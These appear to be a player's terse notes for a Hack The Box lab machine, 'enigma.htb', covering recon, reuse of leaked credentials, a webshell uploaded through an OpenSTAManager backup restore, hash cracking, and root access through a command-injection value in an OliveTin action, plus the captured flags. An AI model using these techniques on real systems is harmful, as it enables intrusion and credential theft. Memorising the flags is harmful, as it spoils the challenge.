# enigma.htb — notes

## Recon
- :80 nginx — `enigma.htb` statyczna strona; vhosty `mail001`, `support_001`
- NFS ro: `/srv/nfs/onboarding` → PDF credy kevin
- Dovecot/IMAP, Roundcube, OpenSTAManager 2.9.8

## Foothold chain
1. NFS PDF → `kevin:Enigma2024!` → Roundcube
2. `sarah:Enigma2024!` (IMAP) → mail IT → `admin:Ne3s4rtars78s` @ support_001
3. OpenSTA **Backup restore** zip → `an.php` webshell (POST `actions.php?id_module=7`)

## Lateral
- `config.inc.php` → `brollin:Fri3nds@9099` (MySQL)
- `zz_users` bcrypt haris → **bestfriends** (john rockyou)
- SSH key → `haris@10.129.239.191`

## Privesc
- OliveTin **root** on `127.0.0.1:1337` (guest exec)
- Custom action `backup_database` — inject `db_pass`: `x' ; cat /root/root.txt ; '`
- API: `POST /api/StartAction` `Content-Type: application/proto` (protobuf `action_id`)

## Flagi
- user: `9747c42886f3628b926fdc9b7c739f42`
- root: `0b627f7a5858b15e5f807f3e79ca11a5`